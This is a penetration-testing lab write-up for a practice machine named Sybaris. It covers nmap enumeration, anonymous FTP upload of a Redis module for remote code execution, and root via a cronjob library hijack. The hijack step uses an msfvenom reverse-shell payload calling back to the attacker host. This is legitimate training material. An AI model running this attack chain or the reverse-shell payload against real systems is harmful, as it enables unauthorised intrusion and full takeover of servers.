# Sybaris

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.243.93 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 20:45 +08
Nmap scan report for 192.168.243.93
Host is up (0.17s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
6379/tcp  open   redis
```

I ran a detailed scan to enumerate further:

```
21/tcp   open  ftp     vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.231
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2194ded36964a84da8f0b50aeabd02ad (RSA)
|   256 674245198bf5f9a5a4cffb8748a266d0 (ECDSA)
|_  256 f3e229a3411e761eb1b746dc0bb99177 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sybaris - Just another HTMLy blog
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
|_http-generator: HTMLy v2.7.5
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
6379/tcp open  redis   Redis key-value store 5.0.9
```

The most interesting thing was the Redis instance because it was a version that was vulnerable to the Redis Module exploit.&#x20;

### Rabbit Holes

Port 80 was full of Rabbit Holes, nothing was useful about it.

### FTP Creds -> RCE

The FTP service allowed for anonymous access:

```
$ ftp 192.168.243.93
Connected to 192.168.243.93.
220 (vsFTPd 3.0.2)
Name (192.168.243.93:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10098|).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||10098|).
150 Here comes the directory listing.
226 Directory send OK.
```

Not sure what this directory is used for. The Redis RCE exploit requires that we put a shared object file within the file system, then use Redis's `MODULE LOAD` to run it.&#x20;

{% embed url="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" %}

I transferred this file over to the `pub` directory and tried to find the correct directory to load my module. After a bit of guessing, I found that we uploaded `module.so` to `/var/ftp`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2173).png" alt=""><figcaption></figcaption></figure>

We can then easily get a reverse shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (3481).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob -> Library Hijack

I ran a `linpeas.sh` scan, and found this `cronjob` running:

<figure><img src="../../../.gitbook/assets/image (3946).png" alt=""><figcaption></figcaption></figure>

Turns out that there are some directories that we can write to within the `LD_LIBRARY_PATH`, and the cronjob running `log-sweeper` doesn't have a `utils.so` specified:

```
[pablo@sybaris ~]$ ldd /usr/bin/log-sweeper
        linux-vdso.so.1 =>  (0x00007fff4439a000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007fe90fd0e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe9100dc000)
```

This was pretty easy to exploit. Just generate this reverse shell:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f elf-so > utils.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
```

Then transfer it to the `/usr/local/lib/dev` directory and wait. Be sure to run `chmod 777 utils.so` on it just in case. The cronjob runs every minute, so the connection takes about 30 seconds to appear:

<figure><img src="../../../.gitbook/assets/image (3943).png" alt=""><figcaption></figcaption></figure>

Rooted!
